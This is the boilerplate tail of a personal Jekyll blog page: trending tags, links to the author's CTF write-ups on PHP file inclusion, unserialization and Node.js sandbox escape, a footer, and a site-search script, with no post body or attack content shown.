    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        



  <section>
    <h2 class="panel-heading">Trending Tags</h2>
    <div class="d-flex flex-wrap mt-3 mb-1 me-3">
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/web/">web</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/ctf/">ctf</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/php/">php</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/algorithm/">algorithm</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/python/">python</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/arcgis/">arcgis</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/blogs/">blogs</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/c-c/">c/c++</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/coding/">coding</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/computer-science/">computer science</a>
      
    </div>
  </section>


            </div>

            
              
              






  <div class="toc-border-cover z-3"></div>
  <section id="toc-wrapper" class="invisible position-sticky ps-0 pe-4 pb-4">
    <h2 class="panel-heading ps-3 pb-2 mb-0">Contents</h2>
    <nav id="toc"></nav>
  </section>


            
          </aside>
        </div>

        <div class="row">
          <!-- tail -->
          <div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 px-md-4">
            
              
              <!-- Recommend the other 3 posts according to the tags and categories of the current post. -->

<!-- The total size of related posts -->


<!-- An random integer that bigger than 0 -->


<!-- Equals to TAG_SCORE / {max_categories_hierarchy} -->















  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  
    










  <aside id="related-posts" aria-labelledby="related-label">
    <h3 class="mb-4" id="related-label">Further Reading</h3>
    <nav class="row row-cols-1 row-cols-md-2 row-cols-xl-3 g-4 mb-4">
      
        <article class="col">
          <a href="/posts/php-session/" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1661422341"
  data-df="ll"
  
>
  Aug 25, 2022
</time>

              <h4 class="pt-0 my-2">PHP的session文件包含与条件竞争</h4>
              <div class="text-muted">
                <p>高中时期对session文件包含与条件竞争的浅显研究</p>
              </div>
            </div>
          </a>
        </article>
      
        <article class="col">
          <a href="/posts/swpu2021-4/" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1660047120"
  data-df="ll"
  
>
  Aug  9, 2022
</time>

              <h4 class="pt-0 my-2">SWPUCTF 2021 新生赛 include</h4>
              <div class="text-muted">
                <p>高中时期在NSSCTF上刷题的题解</p>
              </div>
            </div>
          </a>
        </article>
      
        <article class="col">
          <a href="/posts/swpu2021-3/" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1660047120"
  data-df="ll"
  
>
  Aug  9, 2022
</time>

              <h4 class="pt-0 my-2">SWPUCTF 2021 新生赛 ez_unserialize</h4>
              <div class="text-muted">
                <p>高中时期在NSSCTF上刷题的题解</p>
              </div>
            </div>
          </a>
        </article>
      
    </nav>
  </aside>
  <!-- #related-posts -->


            
              
              <!-- Navigation buttons at the bottom of the post. -->

<nav class="post-navigation d-flex justify-content-between" aria-label="Post Navigation">
  
  

  
    <a
      href="/posts/nodejs-vm-esc/"
      class="btn btn-outline-primary"
      aria-label="Older"
    >
      <p>Node JS沙箱逃逸</p>
    </a>
  

  
    <div class="btn btn-outline-primary disabled" aria-label="Newer">
      <p>-</p>
    </div>
  
</nav>

            

            <!-- The Footer -->

<footer
  aria-label="Site Info"
  class="
    d-flex flex-column justify-content-center text-muted
    flex-lg-row justify-content-lg-between align-items-lg-center pb-lg-3
  "
>
  <p>©
    <time>2025</time>

    
      <a href="https://github.com/lamaper">lamaper</a>.
    

    
      <span
        data-bs-toggle="tooltip"
        data-bs-placement="top"
        title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author."
      >Some rights reserved.</span>
    
  </p>

  <p>Using the <a
        data-bs-toggle="tooltip"
        data-bs-placement="top"
        title="v7.4.1"
        href="https://github.com/cotes2020/jekyll-theme-chirpy"
        target="_blank"
        rel="noopener"
      >Chirpy</a> theme for <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a>.
  </p>
</footer>

          </div>
        </div>

        <!-- The Search results -->

<div id="search-result-wrapper" class="d-flex justify-content-center d-none">
  <div class="col-11 content">
    <div id="search-hints">
      <!-- The trending tags list -->















  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        



  <section>
    <h2 class="panel-heading">Trending Tags</h2>
    <div class="d-flex flex-wrap mt-3 mb-1 me-3">
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/web/">web</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/ctf/">ctf</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/php/">php</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/algorithm/">algorithm</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/python/">python</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/arcgis/">arcgis</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/blogs/">blogs</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/c-c/">c/c++</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/coding/">coding</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/computer-science/">computer science</a>
      
    </div>
  </section>


    </div>
    <div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
  </div>
</div>

      </div>

      <aside aria-label="Scroll to Top">
        <button id="back-to-top" type="button" class="btn btn-lg btn-box-shadow">
          <i class="fas fa-angle-up"></i>
        </button>
      </aside>
    </div>

    <div id="mask" class="d-none position-fixed w-100 h-100 z-1"></div>

    
      <aside
  id="notification"
  class="toast"
  role="alert"
  aria-live="assertive"
  aria-atomic="true"
  data-bs-animation="true"
  data-bs-autohide="false"
>
  <div class="toast-header">
    <button
      type="button"
      class="btn-close ms-auto"
      data-bs-dismiss="toast"
      aria-label="Close"
    ></button>
  </div>
  <div class="toast-body text-center pt-0">
    <p class="px-2 mb-3">A new version of content is available.</p>
    <button type="button" class="btn btn-primary" aria-label="Update">
      Update
    </button>
  </div>
</aside>

    

    <!-- Embedded scripts -->

    
      
      <!-- The comments switcher -->


    

    <!--
  Jekyll Simple Search loader
  See: <https://github.com/christian-fei/Simple-Jekyll-Search>
-->





<script>
  
  document.addEventListener('DOMContentLoaded', () => {
    SimpleJekyllSearch({
      searchInput: document.getElementById('search-input'),
      resultsContainer: document.getElementById('search-results'),
      json: '/assets/js/data/search.json',
      searchResultTemplate: '  <article class="px-1 px-sm-2 px-lg-4 px-xl-0">    <header>      <h2><a href="{url}">{title}</a></h2>      <div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1">        {categories}        {tags}      </div>    </header>    <p>{content}</p>  </article>',
      noResultsText: '<p class="mt-5">Oops! No results found.</p>',
      templateMiddleware: function(prop, value, template) {
        if (prop === 'categories') {
          if (value === '') {
            return `${value}`;
          } else {
            return `<div class="me-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`;
          }
        }

        if (prop === 'tags') {
          if (value === '') {
            return `${value}`;
          } else {
            return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`;
          }
        }
      }
    });
  });
</script>

  </body>
</html>

